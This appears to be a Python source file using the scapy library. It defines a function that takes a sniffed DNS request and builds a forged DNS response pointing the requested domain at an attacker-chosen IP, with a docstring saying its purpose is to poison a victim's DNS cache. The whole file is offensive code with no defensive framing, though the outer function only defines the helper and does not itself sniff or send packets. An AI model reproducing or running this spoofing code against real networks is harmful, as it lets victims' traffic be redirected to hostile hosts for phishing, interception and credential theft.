from scapy import packet
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP

def spoof():

    def create_spoofed_dns_answer(redirect_IP, sniffed_packet: packet) -> packet:
        """
        Creates a spoofed DNS answer packet
        
            :param redirect_IP: IP that will be used to poison the cache of victim
            :param sniffed_packet: DNS request packet requesting IP of spoofed domain sent by victim
            :return: Spoofed DNS packet that can be used to poison DNS cache
        """

        # extract layers from sniffed packet
        req_IP = sniffed_packet[IP]
        req_UDP = sniffed_packet[UDP]
        req_DNS = sniffed_packet[DNS]
        req_DNSQR = sniffed_packet[DNSQR]

        # create spoofed response packet
        resp_IP = IP(src=req_IP.dst, dst=req_IP.src)
        resp_UDP = UDP(sport=req_UDP.dport, dport=req_UDP.sport)
        resp_DNSRR = DNSRR(rrname=req_DNSQR.qname, rdata=redirect_IP)
        resp_DNS = DNS(qr=1, id=req_DNS.id, qd=req_DNSQR, an=resp_DNSRR)
        spoofed_resp = resp_IP / resp_UDP / resp_DNS

        return spoofed_resp
